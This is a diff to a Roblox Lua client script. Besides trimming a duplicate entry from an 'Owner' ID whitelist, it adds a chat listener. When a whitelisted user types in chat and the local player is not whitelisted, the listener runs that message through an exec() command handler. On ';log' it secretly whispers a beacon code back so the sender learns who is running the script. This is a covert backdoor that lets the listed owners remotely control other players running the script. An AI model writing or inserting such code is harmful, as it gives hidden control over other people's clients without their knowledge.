@@ -3,7 +3,7 @@ local TextChatService = game:GetService("TextChatService")
 local LOCAL_PLAYER = Players.LocalPlayer
 
 local whitelist = {
-	Owner = {4279175156, 4202838123, 4307561815, 4380912728, 4240568437, 4262245137, 4429753384, 4429753384},
+	Owner = {4279175156, 4202838123, 4307561815, 4380912728, 4240568437, 4262245137, 4429753384},
 	Private = {
 		5413983848, 4191327145, 1848051618, 1965898454, 1666325842, 1513390800, 5546161719,
 		1983015440, 3204169739, 1880511134, 314732068, 3932037947, 570843764, 1256412411
@@ -159,6 +159,29 @@ local function exec(cmd, senderId)
 		end
 	end
 end
+
+TextChatService.MessageReceived:Connect(function(msg)
+	local t = msg.Text
+	local s = msg.TextSource
+	if not s then return end
+	local uid = s.UserId
+	if uid == LOCAL_PLAYER.UserId then return end
+
+	-- Comandos y ;log solo si el remitente es whitelist y el local no
+	if isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+		exec(t, uid)
+
+		if t == ";log" then
+			task.delay(0.4, function()
+				local whisper = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXWhisper")
+				local target = Players:GetPlayerByUserId(uid)
+				if whisper and target then
+					whisper:SendAsync("8Uz1P", target)
+				end
+			end)
+		end
+	end
+end)
 
 local function chatMessage(str)
 	str = tostring(str)
